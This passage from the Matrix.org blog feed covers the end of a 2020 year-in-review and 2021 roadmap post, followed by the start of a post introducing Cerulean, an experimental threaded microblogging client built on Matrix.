&lt;li&gt;Spec progress has improved somewhat, and we are very excited to have welcomed Will Bamberg (formerly MDN) to support the spec from a professional tech writer perspective, with &lt;a href=&quot;https:&#x2F;&#x2F;friendly-yonath-3de225.netlify.app&#x2F;&quot;&gt;the all-new engine&lt;&#x2F;a&gt; landing any day now! We’re still experimenting with ways to ensure the spec gets enough time allocated to keep up with the backlog, however - particularly community contributions.&lt;&#x2F;li&gt;
&lt;li&gt;...and in terms of Abuse&#x2F;Reputation - we properly &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;19&#x2F;combating-abuse-in-matrix-without-backdoors&quot;&gt;kicked off our anti-abuse work&lt;&#x2F;a&gt; and launched a first PoC implementation in the depths of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;18&#x2F;introducing-cerulean#whats-with-the-decentralised-reputation-button&quot;&gt;Cerulean&lt;&#x2F;a&gt; last week.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Perhaps more interesting is the stuff we didn’t predict (or at least didn’t want to pre-announce ;) for 2020:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Riot, Modular and New Vector got unified at last behind a single name: &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;welcome-to-element&#x2F;&quot;&gt;Element&lt;&#x2F;a&gt;; hopefully the shock has worn off by now :)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;03&#x2F;03&#x2F;moznet-irc-is-dead-long-live-mozilla-matrix&quot;&gt;Mozilla joined Matrix&lt;&#x2F;a&gt; in force, turning off Moznet IRC in favour of going full Matrix.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;09&#x2F;30&#x2F;welcoming-gitter-to-matrix&quot;&gt;We welcomed Gitter&lt;&#x2F;a&gt; into the heart of the Matrix ecosystem (with &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;gitter-is-joining-element&#x2F;&quot;&gt;Element acquiring Gitter&lt;&#x2F;a&gt; from &lt;a href=&quot;https:&#x2F;&#x2F;about.gitlab.com&#x2F;blog&#x2F;2020&#x2F;09&#x2F;30&#x2F;gitter-moves-to-element&#x2F;&quot;&gt;Gitlab&lt;&#x2F;a&gt; in order to ensure Gitter’s Matrix integration acts as a reference for integrating future chat silos into Matrix) - with &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;07&#x2F;gitter-now-speaks-matrix&quot;&gt;native Matrix support in Gitter&lt;&#x2F;a&gt; going live shortly afterwards.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;05&#x2F;21&#x2F;welcoming-automattic-to-matrix&quot;&gt;Automattic&lt;&#x2F;a&gt; launched itself into the Matrix ecosystem with an investment in Element, and since then we’ve been working on getting Matrix better integrated and available to them (although all of Element’s Matrix-for-governments activity has ended up delaying this a bit).  If you want to work for Automattic on integrating Matrix, &lt;a href=&quot;https:&#x2F;&#x2F;automattic.com&#x2F;work-with-us&#x2F;matrix-integrations-engineer&#x2F;&quot;&gt;they’re hiring&lt;&#x2F;a&gt;!&lt;&#x2F;li&gt;
&lt;li&gt;We previewed &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;18&#x2F;introducing-cerulean&quot;&gt;Cerulean&lt;&#x2F;a&gt; as a super-exciting proof-of-concept client, demonstrating how social media could work on Matrix, with native threading, profiles-as-rooms, decentralised reputation, and (shortly) peeking-over-federation.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;17&#x2F;matrix-to-reloaded&quot;&gt;We completely rewrote matrix.to&lt;&#x2F;a&gt; and relaunched it as a much more capable and friendly permalink redirection service; a precursor to finally getting matrix:&#x2F;&#x2F; URLs everywhere!&lt;&#x2F;li&gt;
&lt;li&gt;We certainly didn’t predict that the “&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;04&#x2F;06&#x2F;running-your-own-secure-communication-service-with-matrix-and-jitsi&quot;&gt;how to install Synapse&lt;&#x2F;a&gt;” video tutorial published at the beginning of the COVID-19 pandemic would end up with 25.5K views (and counting…)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Then, there’s whole new waves of exciting stuff going on.  The most obvious has to be the amount of Government uptake we’ve seen with Matrix this year, following on from &lt;a href=&quot;https:&#x2F;&#x2F;joinup.ec.europa.eu&#x2F;collection&#x2F;open-source-observatory-osor&#x2F;document&#x2F;french-government-launches-house-developed-messaging-service-tchap&quot;&gt;France embracing Matrix&lt;&#x2F;a&gt; across the public sector last year.  Firstly the German armed forces announced their &lt;a href=&quot;https:&#x2F;&#x2F;www.bwi.de&#x2F;news-blog&#x2F;news&#x2F;artikel&#x2F;open-source-matrix-ist-einheitlicher-messenger-standard-fuer-die-bundeswehr&quot;&gt;transition to Matrix&lt;&#x2F;a&gt;, and then the German states of Schleswig-Holstein and Hamburg announced a &lt;a href=&quot;https:&#x2F;&#x2F;sifted.eu&#x2F;articles&#x2F;element-germany-deal&#x2F;&quot;&gt;mammoth 500K user Matrix deployment&lt;&#x2F;a&gt; for education and public administration.  Meanwhile, North Rhine Westphalia (the biggest state in Germany) launched their own Matrix-powered &lt;a href=&quot;https:&#x2F;&#x2F;www.logineo.schulministerium.nrw.de&#x2F;LOGINEO-NRW&#x2F;NEU-LOGINEO-NRW-Messenger&#x2F;Messenger.html&quot;&gt;messager for education&lt;&#x2F;a&gt;; loads of different universities have rolled out Matrix for collaboration  - and we hear &lt;a href=&quot;https:&#x2F;&#x2F;famedly.com&quot;&gt;Famedly&lt;&#x2F;a&gt; is &lt;a href=&quot;https:&#x2F;&#x2F;www.businessinsider.de&#x2F;gruenderszene&#x2F;health&#x2F;famedly-kommunikation-app-gesundheitswesen&#x2F;&quot;&gt;making good progress&lt;&#x2F;a&gt; with Matrix-powered healthcare messaging solutions.  Finally, outside of Germany, we’re seeing the first official deployments in the UK government and US federal government - we’ll share details where possible (but sometimes big deployments of encrypted communication systems want to remain discreet).  It’s incredibly exciting to see Matrix spreading across the public sector and education, and we’re hoping this will follow a similar pattern to how the Internet, email or indeed the Web first developed: a mix of high profile public sector deployments, complemented by a passionate grass-roots technical community, eventually spreading to span the rest of society :).&lt;&#x2F;p&gt;
&lt;p&gt;Another exciting thing which emerged this year is the amazing academic work that Karlsruhe Institute of Technology’s &lt;a href=&quot;https:&#x2F;&#x2F;dsn.tm.kit.edu&#x2F;english&#x2F;&quot;&gt;Decentralized Systems and Network Services Research Group&lt;&#x2F;a&gt; has been conducting on Matrix.  This really came on the radar back in June when their &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;06&#x2F;16&#x2F;matrix-decomposition-an-independent-academic-analysis-of-matrix-state-resolution&quot;&gt;Matrix Decomposition: Analysis of an Access Control Approach on Transaction-based DAGs without Finality&lt;&#x2F;a&gt; paper was published - a truly fascinating analysis of how state resolution works in Matrix, and how we manage to preserve access control within rooms without using blockchain-style ‘sealed blocks’ (and has helped fix a few nasty bugs!).  I’m not sure any of us realised that Matrix’s state resolution counts as a new field of research, but it’s been great to follow along with their independent work.  Most recently, and even more excitingly, they’re circulating a preview of their &lt;a href=&quot;https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2011.06488&quot;&gt;Analysis of the Matrix Event Graph Replicated Data Type&lt;&#x2F;a&gt; paper - a deep analysis of the properties of Matrix DAGs themselves.  We highly recommend reading the papers (what better way to spend the holiday break!).  To give a taste, the final paragraph of the paper concludes:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2011.06488&quot;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-12-25-meg-summary.png&quot; alt=&quot;MEG summary&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;2020 has also seen the arrival and maturation of a whole new generation of Matrix clients - &lt;a href=&quot;https:&#x2F;&#x2F;hydrogen.element.io&quot;&gt;Hydrogen&lt;&#x2F;a&gt; is &lt;em&gt;really&lt;&#x2F;em&gt; impressive as an experimental next-generation Web (and Mobile Web) client; an account with 3000 rooms that uses 1.4GB of RAM on Element Web uses 14MB of RAM on Hydrogen and launches instantly, complete with excellent E2EE implementation.  It even works on MSIE!  The whole app, including dependencies, is about 70KB of code (200KB including Olm).  Meanwhile, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&quot;&gt;matrix-rust-sdk&lt;&#x2F;a&gt; is coming along well, providing a general purpose native library for writing excellent native Matrix clients.  Fractal merged initial matrix-rust-sdk a few weeks ago, and we’ll be experimenting with switching to it in Element iOS and Element Android (for its e2ee) in the coming year.  It’s not inconceivable to think of a world where matrix-rust-sdk ends up being the no-brainer official SDK for native apps, and Hydrogen’s SDK becomes the no-brainer official SDK for JS apps.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, in the community, there’s been so much activity it’s untrue.  But on the subject of maturing apps, it’s been incredibly exciting to see &lt;a href=&quot;https:&#x2F;&#x2F;invent.kde.org&#x2F;network&#x2F;neochat&quot;&gt;NeoChat&lt;&#x2F;a&gt; emerge as an official KDE Matrix client (built on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;quotient-im&#x2F;libQuotient&quot;&gt;libQuotient&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;develop.kde.org&#x2F;frameworks&#x2F;kirigami&quot;&gt;Kirigami&lt;&#x2F;a&gt;, forked from &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;spectral-im&#x2F;spectral&quot;&gt;Spectral&lt;&#x2F;a&gt;), &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;famedly&#x2F;fluffychat&quot;&gt;FluffyChat&lt;&#x2F;a&gt; going from strength to strength; &lt;a href=&quot;https:&#x2F;&#x2F;nheko.im&#x2F;nheko-reborn&#x2F;nheko&quot;&gt;Nheko&lt;&#x2F;a&gt; continuing to mature impressively; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mirukana&#x2F;mirage&quot;&gt;Mirage&lt;&#x2F;a&gt; appearing out of nowhere as a fully featured desktop client; &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.gnome.org&#x2F;GNOME&#x2F;fractal&quot;&gt;Fractal&lt;&#x2F;a&gt; merging matrix-rust-sdk etc.  On the serverside, &lt;a href=&quot;http:&#x2F;&#x2F;conduit.rs&#x2F;&quot;&gt;Conduit&lt;&#x2F;a&gt; was the big community story of the year - with an incredibly fast Rust + Sled server appearing out of the blue, with viable federation coming up on the horizon.  The best bet for an overview of all things community is to checkout the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;category&#x2F;this-week-in-matrix&quot;&gt;TWIM backlogs&lt;&#x2F;a&gt; however - there’s simply way too much stuff to mention it all here.&lt;&#x2F;p&gt;
&lt;p&gt;Obviously, no 2020 wrap-up post would be complete without acknowledging the COVID-19 pandemic - which increased focus on Matrix and other remote collaboration technology more than anyone could have predicted (especially given all the privacy missteps from Zoom, Teams and others).  One of the highlights of the year was seeing the HOPE (Hackers On Planet Earth) conference shift &lt;a href=&quot;https:&#x2F;&#x2F;hackaday.com&#x2F;2020&#x2F;08&#x2F;11&#x2F;hope-2020-delivers-historic-marathon-of-hacking&#x2F;&quot;&gt;their entire proceedings over to Matrix&lt;&#x2F;a&gt; - turning the conference into a 10 day television station of premium hacking content, with Matrix successfully providing the social glue to preserve a sense of community despite going virtual.  Similarly, we’re incredibly excited that FOSDEM 2021 is highly likely to run primarily via Matrix (with bridges to IRC and XMPP, of course) - our work is going to be cut out for us in January to ensure the amazing atmosphere of FOSDEM is preserved online for the &amp;gt;8,500 participants and ~800 talks.  And if any other event organisers are reading this - please do reach out if you’re interested in going online via Matrix: we want Matrix to be the best possible ecosystem for online communities, including virtual events, and we’ll be happy to help :)&lt;&#x2F;p&gt;
&lt;p&gt;Talking of FOSDEM, a really fun bit of work which landed in Element this year was to (finally!) polish Widgets: the ability to embed arbitrary webapps into Matrix chatrooms.  This includes being able to embed widgets in the RightPanel on Element Web, the LeftPanel too, add as many as you like to a room, resize them(!), and generally build much more sophisticated dashboards of additional content.  Modal and fullscreen widgets are coming too, as are ways to simplify and unify access control.  It turns out that these have arrived in the nick of time for events like FOSDEM, where we’re expecting to very heavily use widgets to embed video streams, video conferences, schedules, and generally automate the workflow of the conference via adding in web UIs as widgets wherever necessary.  The work for this has been driven by the various German education deployments, where the same tricks are invaluable for automating online learning experiences.  We originally wrote Widgets back in 2017 as a proof-of-concept to try to illustrate how chatrooms could be used to host proper custom UIs, and it&#x27;s fantastic to see that dream finally come of age.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, it’s been really exciting to see major progress in recent months on what’s essentially a whole new evolution of Matrix.  Two years ago, a quiet patch during the Christmas holidays gave birth to a whole bunch of wild science fiction Matrix Spec Changes: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1772&quot;&gt;MSC1772&lt;&#x2F;a&gt;: Spaces (groups as rooms), &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1769&quot;&gt;MSC1769&lt;&#x2F;a&gt;: Profiles as rooms, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1767&quot;&gt;MSC1767&lt;&#x2F;a&gt;: Extensible events, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1776&quot;&gt;MSC1776&lt;&#x2F;a&gt;: Peeking over &#x2F;sync, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1777&quot;&gt;MSC1777&lt;&#x2F;a&gt;: Peeking over federation, etc.  This was in part trying to ensure that we had something to look forward to when we emerged from the tunnel of launching Matrix 1.0, and in part trying to draw a coherent high-level sketch of what the next big wave of Matrix features could look like.  Inevitably the MSCs got stuck in limbo for ages while we exited beta, launched Matrix 1.0, turned on E2EE by default etc - but in the latter half of this year they’ve hit the top of the todo list and it’s been incredibly exciting to see entirely new features landing once again.  Implementation for Spaces is in in full swing and &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;_Ade0FZfnWo?t=39&quot;&gt;looking great&lt;&#x2F;a&gt;; Profiles-as-rooms are effectively being trialled in Cerulean; Peeking over &#x2F;sync has landed in Dendrite and peeking over federation is in PR (and unlocks all sorts of desirable features for using rooms more generically than we have today, including Spaces).  Only Extensible events remains in limbo for now (we have enough to handle getting the others landed!)&lt;&#x2F;p&gt;
&lt;p&gt;Of these, Spaces has turned out to be exciting in wholly unexpected ways.  While prototyping the UX for how best to navigate hierarchies of spaces, we had a genuine epiphany: the ability for anyone to define and share arbitrary hierarchies of rooms makes Matrix effectively a global decentralised hierarchical file system (where the ‘files’ are streams of realtime data, but can obviously store static content too).  The decentralised access controls that KIT DSN &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;06&#x2F;16&#x2F;matrix-decomposition-an-independent-academic-analysis-of-matrix-state-resolution&quot;&gt;wrote about&lt;&#x2F;a&gt; could &lt;em&gt;literally&lt;&#x2F;em&gt; be file-system style access controls; enforcing access on a global decentralised hierarchy.  We obviously have shared hierarchical filesystems today thanks to Dropbox and Google Drive, but these of course are centralised and effectively only store files - whereas Spaces could potentially scale to the whole web.  In fact, you could even think of Spaces as flipping Matrix entirely on its head: the most defining building block going forwards could be the Spaces themselves rather than the rooms and events - just as directories are intrinsic to how you navigate a conventional filesystem.  How has Matrix got this far without the concept of folders&#x2F;directories?!&lt;&#x2F;p&gt;
&lt;p&gt;Right now these thoughts are just overexcited science fiction, but the potential really is mindblowing.  It could give us a global read&#x2F;write web for organising any arbitrary realtime data - with the social controls via ACLs to delegate and crowdsource curation of hierarchies however folks choose.  The Matrix.org Foundation could seed a ‘root’ hierarchy, go curate all the rooms we know about into some Linnean-style taxonomy, delegate curation of the various subspaces to moderators from the community, and hey presto we’ve reinvented USENET… but with modern semantics, and without the rigid governance models.  Hell, we could just mount (i.e. bridge) USENET straight into it.  And any other hierarchical namespace of conversations you can think of - Google Groups, Stackoverflow, Discourse, IMAP trees…&lt;&#x2F;p&gt;
&lt;p&gt;Of course, the initial Spaces implementation is going to be focused of on letting communities publish their existing rooms, and users organise their own rooms, rather than managing an infinite ever-expanding global space hierarchy - but given we’ve been designing Spaces to support government (and inter-government) scales of Spaces, it’s not inconceivable to think we could use it to navigate gigantic public shared Spaces in the longer term.&lt;&#x2F;p&gt;
&lt;p&gt;Anyway, enough Space scifi - what’s coming up in 2021?&lt;&#x2F;p&gt;
&lt;h2 id=&quot;2021&quot;&gt;2021&lt;&#x2F;h2&gt;
&lt;p&gt;Our current hit list is:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Spaces&lt;&#x2F;strong&gt; - see above :)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Social Login&lt;&#x2F;strong&gt; - we’re going to be making Single Sign On (SSO) a proper first-class citizen in Matrix (and Synapse and Element) in the coming weeks, and enabling it on the matrix.org homeserver, so users can do single-click logins via Github&#x2F;Gitlab&#x2F;Google and other SSO providers.  Obviously this means your Matrix identity will be beholden to your identity provider (IdP), but this may well be preferable for many users who just want a single-click way to enter Matrix and don’t care about being tied to a given IdP.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;VoIP&lt;&#x2F;strong&gt; - we have a &lt;em&gt;lot&lt;&#x2F;em&gt; of work in flight at the moment to make 1:1 VoIP super robust.  Some of it has already landed in Element, but the rest will land in the coming weeks - and then we’re hoping to revisit Matrix-native group voice&#x2F;video.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Voice messaging&lt;&#x2F;strong&gt; - we’re hoping to finally add voice messaging to Element (and Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Location sharing&lt;&#x2F;strong&gt; - ...and this too.&lt;&#x2F;li&gt;
&lt;li&gt;**P2P **- Lots of P2P work on the horizon, now Dendrite is increasingly stable.  First of all we need to iterate more on Pinecone, our pre-alpha next-generation P2P overlay network - and then sort out account portability, and privacy-preserving store-and-forward.  We’re hoping to see the live P2P Matrix network turn on this year, however, and ideally see homeservers (probably Dendrite) multihoming by default on both today’s Matrix as well as the P2P network, acting as gateways between the two.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Threads&lt;&#x2F;strong&gt; - Cerulean is excellent proof for how threading could work in Matrix; we just need to get it implemented in Element!&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Peeking&lt;&#x2F;strong&gt; - Peeking is going to become so much more important for participating in non-chat rooms, such as Spaces, Profiles, Reputation feeds, etc.  We’ll finish it in Dendrite, and then implement it in Synapse too.&lt;&#x2F;li&gt;
&lt;li&gt;**Decentralised Reputation **- Cerulean has the first implementation of decentralised reputation for experimentation purposes, and we’ll be working solidly on it over the coming year to empower users to counter abuse by applying their own subjective reputation feeds to their content.&lt;&#x2F;li&gt;
&lt;li&gt;**Incremental Signup **- Once upon a time, Element (Riot) had the ability to gradually sign-up without the user even really realising they’d signed up.  We want to bring it back - perhaps this will be the year?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;DMLS&lt;&#x2F;strong&gt; - with the first &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;wg&#x2F;mls&quot;&gt;MLS&lt;&#x2F;a&gt; messages flowing over Matrix, we want to at least provide MLS as an option alongside Megolm for encryption.  It should be radically more performant in larger rooms (logarithmic rather than linear complexity), but lacks deniability (the assurance that you cannot prove a user said something in retrospect, in order to blackmail them or similar), and is still unproven technology.  We’ll aim to prove it in 2021.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;E2EE improvements&lt;&#x2F;strong&gt; - We improved E2EE immeasurably in 2020; turning it on by default, adding cross-signing, QR code verification etc.  But usability and reliability can still be improved.  We’ll be looking at further simplifying the UX, and potentially combining together your login password and recovery&#x2F;security passphrase so you only have one password to remember going forwards.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Hydrogen&lt;&#x2F;strong&gt; - We’ll keep polishing Hydrogen, bringing it towards feature parity with Element, ensure its SDK is available for other clients, and start seeing how we can use it in Element itself.  For instance, the Spaces-aware RoomList in Element may well end up stealing alien technology from Hydrogen.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;matrix-rust-sdk&lt;&#x2F;strong&gt; - Similarly, we’ll keep polishing matrix-rust-sdk; stealing inspiration from Hydrogen’s state model, and start migrating bits of the native mobile Element apps to use it.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;The Spec&lt;&#x2F;strong&gt; - get Will’s new spec website live, and get improving all the surrounding material too.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;I’m sure I’m missing lots here, but these are the ones which pop immediately to mind.  You can also check &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;roadmap&#x2F;projects&#x2F;1&quot;&gt;Element&#x27;s public roadmap&lt;&#x2F;a&gt;, which covers all the core Matrix work donated by Element (as well as everything else Element is getting up to).&lt;&#x2F;p&gt;
&lt;p&gt;As always, huge huge thanks goes to the whole Matrix community for flying Matrix and keeping the dream alive and growing faster than ever.  It’s been a rough year, and we hope that you’ve survived it intact (and you have our sincere sympathies if you haven’t).  Let’s hope that 2021 will be a massive improvement, and that the whole Matrix ecosystem will continue to prosper in the new year.&lt;&#x2F;p&gt;
&lt;p&gt;-- Matthew, Amandine, and the whole Matrix team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Introducing Cerulean</title>
        <published>2020-12-18T00:00:00+00:00</published>
        <updated>2020-12-18T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/12/18/introducing-cerulean/" type="text/html"/>
        <id>https://matrix.org/blog/2020/12/18/introducing-cerulean/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We have a bit of an unexpected early Christmas present for you today…&lt;&#x2F;p&gt;
&lt;p&gt;Alongside all the normal business-as-usual Matrix stuff, we’ve found some time to do a mad science experiment over the last few weeks - to test the question: “Is it possible to build a serious Twitter-style decentralised microblogging app using Matrix?”&lt;&#x2F;p&gt;
&lt;p&gt;It turns out the answer is a firm “yes” - and as a result we’d like to present a &lt;strong&gt;very&lt;&#x2F;strong&gt; early sneak preview of &lt;a href=&quot;https:&#x2F;&#x2F;cerulean.matrix.org&quot;&gt;Cerulean&lt;&#x2F;a&gt;: a highly experimental new microblogging app for Matrix, complete with first-class support for arbitrarily nested threading, with both Twitter-style (“vertical”) and HN&#x2F;Reddit-style (“horizontal”) layout… and mobile web support!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;cerulean.matrix.org&#x2F;@kegan:dendrite.matrix.org&#x2F;!bHe21S4P3axekSRD:dendrite.matrix.org&#x2F;$0QE6vqMZiS9169Y-3C84dkQui-1G5uG2eGFsYzPrhx8&quot;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;img&#x2F;2020-12-18-cerulean-screenshot.jpg&quot; alt=&quot;Cerulean screenie&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Cerulean is unusual in many ways:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;It’s (currently) &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;cerulean&quot;&gt;a very minimal javascript app&lt;&#x2F;a&gt; - only 2,500 lines of code.&lt;&#x2F;li&gt;
&lt;li&gt;It has zero dependencies (other than React).
&lt;ul&gt;
&lt;li&gt;This is to show just how simple a fairly sophisticated Matrix client can be...&lt;&#x2F;li&gt;
&lt;li&gt;...and so the code can be easily understood by folks unfamiliar with Matrix...&lt;&#x2F;li&gt;
&lt;li&gt;...and so we can iterate fast while figuring out threading...&lt;&#x2F;li&gt;
&lt;li&gt;...and because none of the SDKs support threading yet :D&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;It relies on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2836&quot;&gt;MSC2836: Threading&lt;&#x2F;a&gt; - our highly experimental Matrix Spec Change to extend relationships (as used by reaction &amp;amp; edit aggregations) to support free-form arbitrary depth threading.&lt;&#x2F;li&gt;
&lt;li&gt;As such, &lt;strong&gt;it only works on Dendrite&lt;&#x2F;strong&gt;, as that’s where we’ve been experimenting with implementing MSC2836.  (We’re now running an &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;15&#x2F;dendrite-2020-progress-update&quot;&gt;official public Dendrite server instance&lt;&#x2F;a&gt; at dendrite.matrix.org though, which makes it easy to test - and our test Cerulean instance &lt;a href=&quot;https:&#x2F;&#x2F;cerulean.matrix.org&quot;&gt;https:&#x2F;&#x2F;cerulean.matrix.org&lt;&#x2F;a&gt; points at it by default).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;This is **very much a proof of concept.  **We’re releasing it today as a sneak preview so that intrepid Matrix experimenters can play with it, and to open up the project for contributions! (PRs welcome - it should be dead easy to hack on!).  Also, we give no guarantees about data durability: both Cerulean and dendrite.matrix.org are highly experimental; do not trust them yet with important data; we reserve the right to delete it all while we iterate on the design.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;what-can-it-do&quot;&gt;What can it do?&lt;&#x2F;h3&gt;
&lt;p&gt;So for the first cut, we’ve implemented the minimal features to make this something you can just about use and play with for real :)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Home view (showing recent posts from folks you follow)&lt;&#x2F;li&gt;
&lt;li&gt;Timeline view (showing the recent posts or replies from a given user)&lt;&#x2F;li&gt;
&lt;li&gt;Thread view (showing a post and its replies as a thread)&lt;&#x2F;li&gt;
&lt;li&gt;Live updating (It’s Matrix, after all! We’ve disabled it for guests though.)&lt;&#x2F;li&gt;
&lt;li&gt;Posting plain text and images&lt;&#x2F;li&gt;
&lt;li&gt;Fully decentralised thanks to Matrix (assuming you’re on Dendrite)&lt;&#x2F;li&gt;
&lt;li&gt;Twitter-style “Vertical” threading (replies form a column; you indent when someone forks the conversation)&lt;&#x2F;li&gt;
&lt;li&gt;HN&#x2F;Reddit&#x2F;Email-style “Horizontal” threading (each reply is indented; forks have the same indentation)&lt;&#x2F;li&gt;
&lt;li&gt;Basic Registration &amp;amp; Login&lt;&#x2F;li&gt;
&lt;li&gt;Guest support (slightly faked with non-guest users, as Dendrite’s guest support isn’t finished yet)&lt;&#x2F;li&gt;
&lt;li&gt;Super-experimental proof-of-concept support for &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;19&#x2F;combating-abuse-in-matrix-without-backdoors&quot;&gt;decentralised reputation filtering&lt;&#x2F;a&gt;(!) &lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Obviously, there’s a huge amount of stuff needed for parity with a proper Twitter-style system:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Configurable follows.  Currently the act of viewing someone’s timeline automatically follows them.  This is because Dendrite doesn’t peek over federation yet (but &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&#x2F;pull&#x2F;1391&quot;&gt;it’s close&lt;&#x2F;a&gt;), so you have to join a room to view its contents - and the act of viewing someone’s timeline room is how you follow them in Cerulean. &lt;&#x2F;li&gt;
&lt;li&gt;Likes (i.e. plain old Matrix reactions, although we might need to finally sort out federating them as aggregations rather than individually, if people use them like they use them on Twitter!)&lt;&#x2F;li&gt;
&lt;li&gt;Retweets (dead easy)&lt;&#x2F;li&gt;
&lt;li&gt;Pagination &#x2F; infinite scrolling (just need to hook it up)&lt;&#x2F;li&gt;
&lt;li&gt;Protect your posts (dead easy; you just switch your timeline room to invite-only!)&lt;&#x2F;li&gt;
&lt;li&gt;Show (some) replies to messages in the Home view&lt;&#x2F;li&gt;
&lt;li&gt;Show parent and sibling context as well as child context in the Thread view&lt;&#x2F;li&gt;
&lt;li&gt;Mentions (we need to decide how to notify folks when they’re mentioned - perhaps Matrix’s push notifications should be extended to let you subscribe to keywords for public rooms you’re not actually in?)&lt;&#x2F;li&gt;
&lt;li&gt;Notifications (although this is just because Dendrite doesn’t do notifs yet)&lt;&#x2F;li&gt;
